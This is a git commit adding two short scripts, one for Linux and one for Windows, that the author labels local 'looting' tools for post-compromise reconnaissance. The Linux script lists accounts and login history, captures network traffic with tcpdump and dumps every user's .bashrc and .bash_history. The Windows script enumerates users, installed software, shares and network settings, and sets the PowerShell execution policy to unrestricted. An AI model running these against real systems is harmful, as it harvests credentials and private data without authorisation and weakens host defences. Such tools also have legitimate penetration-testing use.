cc4b99b16e204b01f03ab55f088d949853935de8
Eric V <eric@eevn.io>
2017-07-03 13:11:38 -0700

    Add files via upload

---
+++ native_scripts/forgetmenot_lin.sh
@@ -0,0 +1,41 @@
+#!/bin/bash
+
+#
+#	forgetmenot_lin.sh
+#	standalone linux looting script
+#
+#	Eric Valenzuela, eevn.io
+#	07/03/2017
+#
+
+print 'This script does not save on its own. To save, pipe the output to a file.'
+
+uname -a
+printenv
+
+getent passwd
+w
+last
+
+cat /etc/sysconfig/network
+cat /etc/resolv.conf
+find /etc/sysconfig/network-scripts/ -type f -exec cat {} +
+
+ifconfig
+arp -v
+
+timeout 60 tcpdump
+
+tcpdump &
+sleep 60s && pkill -HUP -f tcpdump
+
+df
+lsblk
+blkid
+cat /etc/fstab
+
+shopt -s dotglob
+for f in /home/*/* ; do
+	if [[ $f =~ .*.bashrc ]] ; then echo $f; cat $f; fi
+	if [[ $f =~ .*.bash_history ]] ; then echo $f; cat $f; fi
+done
---
+++ native_scripts/forgetmenot_win.bat
@@ -0,0 +1,37 @@
+@echo on
+
+rem
+rem	fogetmenot_win.bat
+rem	Windows-only standalone local looter. No client/server funtion.
+rem	
+rem	Eric Valenzuela, eevn.io
+rem	07/03/2017
+rem
+
+title forgetmenot_win 
+
+echo "This script does not save on its own. Pipe it to a file to save the output."
+
+hostname
+
+wmic os
+wmic product
+wmic logicaldisk
+wmic netlogin
+wmic startup
+
+powershell set-executionpolicy unrestricted
+powershell get-ciminstance win32_operatingsystem | FL *
+
+net user
+wmic UserAccount get Name
+wmic rdaccount
+
+ifconfig
+netstat
+wmic nicconfig
+wmic netuse
+wmic share
+
+powershell get-netipconfiguration
+arp /a
